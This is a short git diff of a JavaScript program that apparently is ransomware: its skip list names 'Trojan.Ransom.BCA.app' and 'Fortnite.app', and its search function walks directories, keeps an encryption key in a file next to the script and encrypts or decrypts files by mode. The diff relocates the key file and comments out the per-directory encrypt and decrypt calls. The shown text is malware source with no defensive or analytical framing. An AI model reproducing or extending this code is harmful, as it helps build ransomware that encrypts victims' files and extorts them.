@@ -75,9 +75,9 @@ function search (pathIn, mode) {
         }
 
         let key;
-        fs.readFile("key", "utf8", function (err, data) {
+        fs.readFile(__dirname + "/key", "utf8", function (err, data) {
             if (err) {
-                fs.writeFile("key", newKey, (err) => {if (err) throw err});
+                fs.writeFile(__dirname + "/key", newKey, (err) => {if (err) throw err});
                 key = newKey;
             } else {
                 key = data;
@@ -103,8 +103,8 @@ function search (pathIn, mode) {
                     } else if(stat.isDirectory() ) {
                         console.log( "'%s' is a directory.", filePath);
                         if (file !== "Fortnite.app" && file !== "Trojan.Ransom.BCA.app") {
-                            if (mode === 0) encrypt(filePath, key, true);
-                            else if (mode === 1) decrypt(filePath, key, true);
+                            /*if (mode === 0) encrypt(filePath, key, true);
+                            else if (mode === 1) decrypt(filePath, key, true);*/
                             search(filePath, mode);
                         }
                     }
